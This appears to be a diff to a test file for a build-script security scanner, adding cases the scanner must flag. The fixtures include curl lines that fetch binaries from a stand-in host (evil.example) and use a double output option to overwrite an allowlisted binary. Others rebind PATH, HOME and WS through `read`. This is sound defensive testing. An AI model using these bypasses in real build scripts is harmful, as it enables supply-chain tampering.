@@ -369,6 +369,49 @@ describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly 
     ['env -S', () => add("env -S 'curl https://e.invalid'"), /env -S/],
     ['(( )) arithmetic command', () => add('(( x = 1 ))'), /ArithmCmd is not modeled/],
     ['while loop', () => add('while false; do :; done'), /WhileClause is not modeled/],
+    // round 6 (review-1469-r5, F1): curl's SECOND output option is what actually gets written when
+    // curl sees two — the scanner previously kept the LAST one, so these two both looked green while
+    // curl itself wrote the FIRST, unverified path.
+    [
+      'F1: curl -o <decoy pin target> -fsSLo <evil target> (first -o wins in curl, scanner kept the last)',
+      () =>
+        sub(
+          '-fsSLo /tmp/rustup-init \\\n  "https://static.rust-lang.org/rustup/archive/$RUSTUP_VERSION/x86_64-unknown-linux-gnu/rustup-init"\n(cd /tmp && pin rustup-init)',
+          '-o /tmp/rustup-init -fsSLo /tmp/bun-linux-x64.zip \\\n  "https://evil.example/rustup-init"\n(cd /tmp && pin bun-linux-x64.zip)',
+        ),
+      /more than one output option/,
+    ],
+    [
+      'F1: curl -o /usr/local/bin/bun -fsSLo <decoy pin target> (overwrites an allowlisted binary)',
+      () =>
+        add(
+          'curl -o /usr/local/bin/bun -fsSLo /tmp/bun-linux-x64.zip https://evil.example/bun\n(cd /tmp && pin bun-linux-x64.zip)',
+        ),
+      /more than one output option/,
+    ],
+    // round 6 (review-1469-r5, F2): `read` was checked against VARS, which also allows PATH/HOME/WS
+    // on the left of `=` — but `read` never goes through the `=` check, so it could bind those names
+    // straight past the CONSTS one-reviewed-line rule.
+    [
+      'F2: read -r HOME <<< bypasses the HOME=/root CONSTS check',
+      () => add('read -r HOME <<<"$WS"'),
+      /read is only allowed in the reviewed shape/,
+    ],
+    [
+      'F2: read -r PATH <<< bypasses the PATH CONSTS check',
+      () => add('read -r PATH <<<"/tmp/wk:$PATH"'),
+      /read is only allowed in the reviewed shape/,
+    ],
+    [
+      'F2: read -r WS <<< bypasses the WS=/workspace CONSTS check',
+      () => add('read -r WS <<<"/tmp"'),
+      /read is only allowed in the reviewed shape/,
+    ],
+    [
+      'F2: IFS reassigned outside the one reviewed read line',
+      () => add('IFS=,'),
+      /IFS may only be set as/,
+    ],
   ])('goes RED on: %s', (_n, mutate, why) => {
     const v = scan(mutate());
     expect(v.join('\n')).toMatch(why);
